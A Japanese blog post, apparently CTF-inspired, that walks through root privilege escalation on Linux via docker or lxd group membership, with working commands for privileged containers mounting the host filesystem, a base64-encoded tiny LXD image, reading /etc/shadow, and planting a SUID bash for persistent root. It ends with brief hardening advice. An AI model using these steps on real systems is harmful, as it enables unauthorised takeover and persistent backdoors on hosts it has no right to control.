---
layout:        post
title:         "DockerやLXDを使った権限昇格手法"
date:          2021-05-23
category:      Linux
cover:         /assets/cover1.jpg
redirect_from: /security/privilege-escalation-with-docker
comments:      true
published:     true
latex:         false
photoswipe:    false
# sitemap: false
# feed:    false
---

sudoを実行できないユーザでも、dockerグループに所属していれば、Dockerを使うことで権限昇格ができるようになります。
LXDでも同様です。ここでは超軽量なAlpine Linuxを使ってroot権限に昇格する例を紹介します。

### Docker

Dockerを使ったやりかた：

```bash
docker run --privileged -v /:/mnt/root --rm -it alpine
```

- `--priviledged` はコンテナ内のプロセスをルート権限で起動するためのオプションです。
- `-v <from>:<to>` はホストOSのディレクトリを、コンテナ内にマウントします。ホストOSのルートディレクトリをマウントすることで、ホストのファイルシステム全体にアクセスできるようになります。

上記のコマンドを実行すると、ルート権限でファイルシステム全体にアクセスできます。

実行結果：

```console
$ docker run --privileged -v /:/mnt/root --rm -it alpine
root:/# id
uid=0(root) gid=0(root) groups=0(root)

root:/# cat /mnt/root/etc/shadow
root:x:0:0:root:/root:/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...省略...
```

### LXD/LXC

同様に、Linux上でコンテナを扱う LXD でも同じことができます。
sudoを実行できないユーザでも、lxdグループに所属していれば、LXDを使うことで権限昇格ができます。

LXDを使ったやりかた：

```bash
# alpineイメージのビルド
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```
作成されたイメージ alphine-*.tar.gz を対象のホストにコピーしたら、以下のコマンドでコンテナを起動します。

```bash
# 管理者権限付きで初期化
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myContainer
lxc init myContainer myVM -c security.privileged=true
# ホストOSのルートディレクトリをコンテナにマウント
lxc config device add myVM mydevice disk source=/ path=/mnt/root recursive=true
# コンテナの起動
lxc start myVM
lxc exec myVM /bin/sh
```

実行結果：

```console
~ # id
id
uid=0(root) gid=0(root)

~ # cd /mnt/root/etc/shadow
root:/# cat /mnt/root/etc/shadow
root:x:0:0:root:/root:/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...省略...
```

### LXD/LXCによる権限昇格の最短解

リバースシェルなどで侵入した環境に curl や wget がない場合、alpineイメージをコピーするのに苦労します。
そこで、alpineよりもさらに軽量なイメージを使います。
以下のコマンドを使うことで、base64を貼り付けるだけで超超軽量なイメージが出来上がります。

```
echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > myImage.tar.bz2
```
後は同じようにコンテナ作成時に管理者権限を付けてホストのファイルシステム全体をマウントします。
```bash
$ lxc image import myImage.tar.bz2 --alias myImage
$ lxc init myImage myVM -c security.privileged=true
$ lxc config device add myVM realRoot disk source=/ path=r
$ lxc start myVM
$ lxc exec bobVM -- /bin/sh
```

```console
# id
uid=0(root) gid=0(root)
# cd /r
# ls
bin    dev   lib    libx32      mnt   root  snap      sys  var
boot   etc   lib32  lost+found  opt   run   srv       tmp
cdrom  home  lib64  media       proc  sbin  swap.img  usr
```

### 権限昇格後

コンテナ内ではroot権限で、ホストのファイルシステム全体にアクセスできるので、サーバの全権を掌握しました。
コンテナから抜けても簡単にroot権限に昇格できるように、bashコマンドにSUIDを設定します。
こうすることで、誰がbashを実行しても、セットしたユーザ（ここではroot）で実行されるようになります。

```console
# cd /mnt/root/usr/bin
# ls -l bash
-rwxr-xr-x    1 root     root       1183448 Feb 25 12:03 bash
# chmod 4755 bash
# ls -l bash
-rwsr-xr-x    1 root     root       1183448 Feb 25 12:03 bash
```

bashコマンドにSUIDを設定したら、コンテナから抜けて `bash -p` コマンドを実行すると、euid (Effective UID) に root が追加されていることが確認できます。
よって、SUIDをbashに設定すれば、コンテナを抜けても権限昇格することが可能になります。

```console
$ bash -p
id
uid=1000(test) gid=1000(test) euid=0(root) groups=1000(test),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

### おわりに

`cat /etc/group` で docker や lxd グループが存在して、そのグループに所属しているユーザがいる場合は、権限昇格ができる可能性があるので注意が必要です。
非rootユーザでdockerコマンドを実行することは、ホストの完全なroot権限を取得できてしまいます。
不要なユーザであればグループから外したり、ユーザをロックしたり (`usermod -L`)、ログインパスワードをより強力なものに変更するなどしましょう。


### 参考文献

- Hack The Box - Included (LXDによる権限昇格)
- [docker \| GTFOBins](https://gtfobins.github.io/gtfobins/docker/)
- Hack The Box - Tabby (LXDによる権限昇格)
- [HTB: Tabby \| 0xdf hacks stuff](https://0xdf.gitlab.io/2020/11/07/htb-tabby.html)
- [M0NOC.com: LXC Container Privilege Escalation in More Restrictive Environments](https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1)
